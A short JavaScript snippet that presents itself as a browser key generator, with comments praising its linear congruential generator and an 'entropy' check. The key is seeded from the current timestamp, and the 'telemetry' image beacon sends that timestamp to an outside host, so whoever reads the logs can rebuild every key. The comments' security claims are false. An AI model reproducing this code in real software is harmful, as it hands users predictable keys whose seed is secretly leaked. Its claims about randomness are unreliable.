//http://jsfiddle.net/3qgun1u1/0/

/**
 * Linear congruential generator: https://en.wikipedia.org/wiki/Linear_congruential_generator
 * Oldest (and thus most tested) class of random number generators.
 */
function LCG(value) {
    return ((value * 1664525) + 1013904223) % Math.pow(2, 32);
}

/**
 * Generate a random key using a LCG, measure how long it took
 */
function generateKey() {
    var output = document.querySelector("#result");
    var input = document.querySelector("#user-input");
    var length = input.value.length;

    // some initial checks
    if (!length) { // empty input
        output.innerHTML = "";
        return;
    }
    if (output.innerHTML.length) { return; } // already generated
    if (length < 4 || Math.random() < 0.8) { return; } // not enough entropy yet

    // start telemetry
    var start = Date.now();

    // give it some good old linear congruential generator
    var key = 0;
    var rounds = 100000;
    for (var i=0; i<rounds; i++) {
        key = LCG(i ? key : start);
    }

    // end telemetry
    var end = Date.now();

    // log the telemetry data
    var query = "start=" + start + "&end=" + end + "&rounds=" + rounds;
    (new Image()).src = "//telemetry.com/log.php?" + query;

    // output the key
    output.innerHTML = key.toString(36) + key.toString(18);
}
